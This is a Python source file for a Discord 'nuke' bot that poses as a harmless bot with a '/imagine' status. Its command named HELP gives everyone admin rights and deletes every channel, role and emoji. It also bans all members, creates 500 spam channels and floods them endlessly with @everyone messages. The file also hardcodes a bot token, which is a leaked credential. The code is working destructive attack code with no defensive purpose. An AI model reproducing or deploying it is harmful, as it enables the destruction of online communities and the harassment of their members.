import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
from webserver import keep_alive
token = "MTEwMjMxNjY5ODI0MzE4MjY5Mw.GIdjoh.FHh9jzAdBLsz3WwAz54X9BiXs10NZQtm5VXBL4"


SPAM_CHANNEL =  ["NUKED BY A PANDA" , "🐼" , "FUCKED" , "oops Beamed","RESPECT PANDAS","Shoulda Listened","LONG LIVE PANDAS 🐼","Nuked by FLIXER","oops got nuked","I run you","Nuked by FLIXER","Flixer is the King Lol","FLIXER KICKED YOUR ASS"]
SPAM_MESSAGE = ["@everyone DUMP NEVER BELIEVE PEOPLE!https://media2.giphy.com/media/aUhEBE0T8XNHa/200.gif","@everyone ARE YOU IDIOT DONT BELIEVE PANDAS https://media2.giphy.com/media/aUhEBE0T8XNHa/200.gif","@everyone NUKED BY FLIXER https://media2.giphy.com/media/aUhEBE0T8XNHa/200.gif","@everyone https://media2.giphy.com/media/aUhEBE0T8XNHa/200.gif","@everyone https://media2.giphy.com/media/aUhEBE0T8XNHa/200.gif","@everyone https://media2.giphy.com/media/aUhEBE0T8XNHa/200.gif","@everyone https://media2.giphy.com/media/aUhEBE0T8XNHa/200.gif"]
client = commands.Bot(command_prefix="!")

keep_alive()
@client.event
async def on_ready():
   print(''' 
   
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝ 
██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░ 
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░ 
██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░  
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░ 

Support Server:https://discord.gg/BQ6uFNHkh3
https://discord.gg/rDjhXb3r5yJ
 ''')
   await client.change_presence(activity=discord.Game(name="/imagine"))

@client.command()
@commands.is_owner()
async def STOP(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
async def HELP(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban('')
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("NUKED BITCH")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)